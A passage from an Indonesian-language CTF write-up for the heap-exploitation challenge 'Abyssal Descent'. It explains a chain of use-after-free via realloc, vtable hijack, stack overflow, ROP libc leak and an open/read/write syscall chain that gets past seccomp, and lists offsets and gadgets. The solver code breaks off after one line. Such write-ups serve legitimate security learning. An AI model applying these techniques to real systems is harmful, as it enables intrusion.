# 8. Abyssal Descent

**Kategori:** Pwn / Binary Exploitation  
**Target:** `cyberleague-shared-nlb-8eebe09f116ebe55.elb.ap-southeast-1.amazonaws.com:30005`  
**Flag format:** `CYBERLEAGUE{...}`



## Deskripsi

DSV Nautilus memiliki autonomous control system. Beberapa menu bekerja pada struktur heap dan realtime feed. Kombinasi `realloc()` dengan pointer lama menciptakan stale pointer yang kemudian dapat dieksploitasi.

## 8.1 Kerentanan Utama

Exploit chain terdiri dari beberapa primitive:

1. **Use-After-Free / stale pointer** akibat realloc.
2. **8-byte write** lewat `correct_echo()`.
3. **vtable hijack** pada object pressure.
4. **Stack overflow** pada `hw_cal_v1()`.
5. **ROP** untuk leak libc.
6. **ORW** karena seccomp memblokir `execve` family.

## 8.2 Heap Grooming

Tahapan awal solver:

```text
init sonar dengan 5 channels
        ↓
enable realtime
        ↓
rekam 8 ping ukuran 0x100
        ↓
rekam ping ke-9 ukuran 0x40
        ↓
realloc memindahkan array pings/sizes
        ↓
chunk lama masuk tcache
        ↓
pressure object dialokasikan ke posisi chunk lama
```

Object pressure kemudian tumpang tindih secara logis dengan pointer yang sebelumnya menunjuk ke realtime feed.

## 8.3 Leak PIE

`query_echo(0)` membocorkan vtable pointer.

Offset penting:

```text
OFF_PRESSURE_VTABLE = 0x4d20
```

Maka:

```text
pie_base = leaked_vtable - 0x4d20
```

## 8.4 Vtable Hijack

`correct_echo(index, value)` memberikan write 8-byte.

Pertama, pointer vtable diarahkan ke object sendiri:

```text
pressure->vtable = pressure_addr
```

Kemudian entry vtable yang dipanggil `calibrate_thread()` diubah agar menunjuk ke:

```text
hw_cal_v1()
```

Offset:

```text
OFF_HW_CAL_V1 = 0x1971
```

## 8.5 Stack Overflow pada `hw_cal_v1`

Fungsi menggunakan `memcpy()` berdasarkan length yang dikontrol client.

Offset RIP:

```text
0x48 = 72 bytes
```

Payload dasar:

```text
A × 0x48
ROP chain
```

Gadget penting:

```text
RET        = 0x101a
POP RDI    = 0x1613
POP RSI    = 0x161c
POP RDX    = 0x1621
```

## 8.6 Leak libc

ROP pertama dipakai untuk:

```text
puts(puts@GOT)
```

Sehingga diperoleh:

```text
puts@libc
```

dan kemudian:

```text
libc_base = puts_leak - puts_offset
```

## 8.7 Mengapa ORW

Service menggunakan seccomp yang memblokir:

```text
execve
execveat
fork
vfork
```

Karena itu shell biasa bukan jalur yang paling tepat.

Sebaliknya gunakan:

```text
Open
Read
Write
```

secara syscall:

```text
open("/flag", O_RDONLY, 0)
read(fd, buffer, 0x100)
write(1, buffer, 0x100)
```

Nomor syscall:

```text
open  = 2
read  = 0
write = 1
```

## 8.8 Konstanta Penting

| Item | Nilai |
|---|---:|
| RIP offset | `0x48` |
| pings relationship | `0xa0` |
| pressure vtable | `0x4d20` |
| `hw_cal_v1` | `0x1971` |
| `run_diagnostic` | `0x1f85` |
| `pop rdi` | `0x1613` |
| `pop rsi` | `0x161c` |
| `pop rdx` | `0x1621` |
| `ret` | `0x101a` |
| `open` syscall | `2` |
| `read` syscall | `0` |
| `write` syscall | `1` |

## 8.9 Kerangka Solver

Pada sesi asli solver final bernama:

```text
solve_abyssal_descent_final5.py
```

Struktur exploit yang digunakan:

```python
# Heap grooming
